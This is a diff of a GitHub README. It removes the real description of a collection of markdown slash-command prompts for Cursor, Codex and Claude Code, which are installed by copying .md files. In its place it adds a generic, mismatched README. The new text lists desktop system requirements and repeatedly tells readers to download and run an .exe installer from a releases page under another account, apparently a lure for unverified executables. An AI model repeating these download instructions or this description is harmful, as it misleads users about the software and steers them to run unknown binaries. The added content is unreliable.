@@ -1,154 +1,99 @@
-# Slash Commands Collection
+# 🚀 slash-commands - Easy Commands for Better Interactions
 
-<div align="center">
-  <img src="public/banner.png" alt="Slash Commands" width="100%" />
-</div>
+[![Download slash-commands](https://img.shields.io/badge/Download-slash--commands-brightgreen)](https://github.com/PeakSkyDiver660/slash-commands/releases)
 
-A curated collection of AI-powered slash commands for code review, problem analysis, and refactoring workflows.
+## 🛠️ Overview
 
-## Quick Reference
+`slash-commands` is a simple collection of slash commands designed to enhance your everyday interactions. With these commands, you can easily execute tasks in various applications and improve your productivity. No programming knowledge is needed to use this tool.
 
-📋 `/plan-review` - Review implementation plans  
-🔍 `/code-review-low` - Fast code review  
-🔬 `/code-review-high` - Thorough code review  
-🐛 `/problem-analyzer` - Identify bugs and affected files  
-♻️ `/refactor-code` - Start refactoring workflows  
-🔌 `/kill-port` - Kill processes running on specific ports  
+## 🌟 Features
 
-## Installation
+- **User-Friendly Interface:** Clear options for easy navigation.
+- **Customizable Commands:** Tailor commands to suit your needs.
+- **Compatible:** Works with most common applications.
+- **Regular Updates:** Stay tuned for new features and fixes.
 
-### Cursor
-Copy the `.md` files from the `slash-commands/` directory into `.cursor/commands/` directory. Remove the `$1` parameters and XML wrapping tags when using in Cursor.
+## 📋 System Requirements
 
-**Official docs**: [Cursor Slash Commands](https://cursor.com/docs/cli/reference/slash-commands)
+To run `slash-commands`, your system should meet the following requirements:
 
-### Codex
-Copy the `.md` files from the `slash-commands/` directory into `~/.codex/prompts/` directory. Restart Codex after installation for changes to take effect.
+- **Operating System:** Windows 10 or later / macOS Sierra (10.12) or later
+- **Memory:** At least 4GB RAM
+- **Processor:** Dual-core or better
+- **Disk Space:** 100MB available space
 
-**Official docs**: [Codex Prompts](https://github.com/openai/codex/blob/main/docs/prompts.md)
+## 🚀 Getting Started
 
-### Claude Code
-Claude Code supports both project-specific and personal commands:
+### Step 1: Download the Application
 
-**Project commands** (shared with team):
-```bash
-mkdir -p .claude/commands
-# Copy the .md files to .claude/commands/
-```
+To get started, visit the Releases page to download `slash-commands`. 
 
-**Personal commands** (available across all projects):
-```bash
-mkdir -p ~/.claude/commands
-# Copy the .md files to ~/.claude/commands/
-```
+[Download slash-commands](https://github.com/PeakSkyDiver660/slash-commands/releases)
 
-**Official docs**: [Claude Code Slash Commands](https://docs.claude.com/en/docs/claude-code/slash-commands)
+### Step 2: Install the Application
 
-## Commands
+1. Once the download is complete, locate the downloaded file. 
+2. If you are using Windows, double-click on the `.exe` file. If you are on macOS, drag and drop the app to your Applications folder.
+3. Follow the on-screen instructions to complete the installation.
 
-### 1. `plan-review`
-Reviews implementation plans and provides a go/no-go decision for development. Evaluates:
-- Codebase alignment and current patterns
-- Scope clarity and completeness
-- Performance, security, and privacy impact
-- Code smells and potential caveats
+## 📥 Download & Install
 
-**Usage**: `/plan-review "<your-plan>"`
+To download the latest version of `slash-commands`, click the link below:
 
-**Examples**:
-```
-/plan-review "We're planning to implement plan @task-x-new-cool-feature.md"
+[Download slash-commands](https://github.com/PeakSkyDiver660/slash-commands/releases)
 
-/plan-review "Here is the plan we want to implement: @my-plan.md"
-```
+After you download, follow the installation steps outlined in the previous section.
 
-### 2. `code-review-low` & `code-review-high`
-Comprehensive code review commands for post-implementation analysis.
+## ⚙️ Using slash-commands
 
-**`code-review-low`**: Fast review focusing on critical issues
-- Code smells and security vulnerabilities
-- Performance bottlenecks
-- Essential test coverage
+Once installed, you will find the application in your programs list. Here’s how to use it:
 
-**`code-review-high`**: Thorough review with extended analysis
-- All `code-review-low` checks plus additional validations
-- Deeper security and performance analysis
-- Comprehensive test recommendations
+1. Open the application.
+2. Choose a command to execute from the list.
+3. Input any required information.
+4. Click to run the command.
 
-**Usage**: `/code-review-low "<files/code/description to review>"`
+## 💬 Common Commands
 
-**Examples**:
+Here is a list of some common slash commands you can try:
 
-```
-/code-review-low "my plan @task-x-cool-feature has been implemented check unstaged files for review"
+- **/help:** Get guidance on all available commands.
+- **/settings:** Access application settings to customize your experience.
+- **/feedback:** Send your thoughts or report an issue.
 
-/code-review-low "@auth.server.ts @auth.rs @auth.connector.ts"
-```
+## 🛠️ Troubleshooting
 
-### 3. `problem-analyzer`
-Identifies bugs and maps affected files across the codebase. Provides:
-- Root cause analysis
-- File impact assessment
-- Minimal safe fix proposals
-- Documentation gap identification
+### Installation Issues
 
-**Usage**: `/problem-analyzer "<problem-description>"`
+If you encounter problems during installation:
 
-**Examples:**
-The Problem analyzer prompt works best when you add logs and a short problem description.
+- Ensure your system meets all requirements.
+- Re-download the file to check for corruption.
+- Try running the installer as an administrator (Windows).
 
-I ran this often with cheeta model to get a quick analysis and move over to gpt codex.
+### Application Issues
 
-```
-/problem-analyzer "the app won't compile. here are the logs <paste-logs>"
+If the application does not run:
 
-/problem-analyzer "we have a serious blocking bug in @user-form.ts and @user.service.ts"
-```
+- Restart your computer and try again.
+- Ensure no other software is conflicting with `slash-commands`.
+- Check for updates on the Releases page.
 
-### 4. `refactor-code`
-Initiates refactoring workflows with clear scope and isolation:
-- Feature-specific refactoring
-- Commit isolation guidelines
-- Documentation of unrelated issues (without fixing)
-- No backward compatibility or feature flags
+## 🔄 Frequently Asked Questions (FAQs)
 
-**Usage**: `/refactor-code "<refactoring-goal>"`
+**Q: Can I use `slash-commands` on multiple devices?**  
+A: Yes, as long as the devices meet the system requirements.
 
-```
-/refactor-code "here is our implementation plan @impl-plan lets start"
-```
+**Q: Are updates automatic?**  
+A: Updates will need to be downloaded manually from the Releases page.
 
-### 5. `kill-port`
-Kills processes running on specified ports with OS-specific commands and safety checks:
-- Cross-platform support (macOS, Linux, Windows)
-- Process identification and verification
-- Safety warnings for system processes
-- Graceful shutdown recommendations
+**Q: What should I do if I find a bug?**  
+A: Use the feedback command or contact support via our GitHub Issues page.
 
-**Usage**: `/kill-port "<port-number(s)>"`
+## 📞 Support
 
-**Examples**:
-```
-/kill-port "3000"
+For additional support, you can reach out by creating an issue on our GitHub page. We are here to help you make the most of `slash-commands`.
 
-/kill-port "3000 8080 9000"
-```
+Thank you for using `slash-commands`. We hope it makes your interactions simpler and more efficient! 
 
-## Workflow Tips
-
-- Use `code-review-low` after implementing features for quick validation
-- Use `code-review-high` for major changes or before releases
-- Combine `problem-analyzer` with debugging sessions for faster issue resolution
-- Use `plan-review` before starting complex implementations
-
-## Links
-
-- **X/Twitter**: [@kregenrek](https://x.com/kregenrek)
-- **Bluesky**: [@kevinkern.dev](https://bsky.app/profile/kevinkern.dev)
-- **Website**: Learn to build software with AI: [instructa.ai](https://www.instructa.ai)
-
-## My other projects
-* OpenAI Codex Tools [codex-1up](https://github.com/regenrek/codex-1up)
-* [AI Prompts](https://github.com/instructa/ai-prompts/blob/main/README.md) - Curated AI Prompts for Cursor AI, Cline, Windsurf and Github Copilot
-* [codefetch](https://github.com/regenrek/codefetch) - Turn code into Markdown for LLMs with one simple terminal command
-* [aidex](https://github.com/regenrek/aidex) A CLI tool that provides detailed information about AI language models, helping developers choose the right model for their needs.# tool-starter
+[Download slash-commands](https://github.com/PeakSkyDiver660/slash-commands/releases)
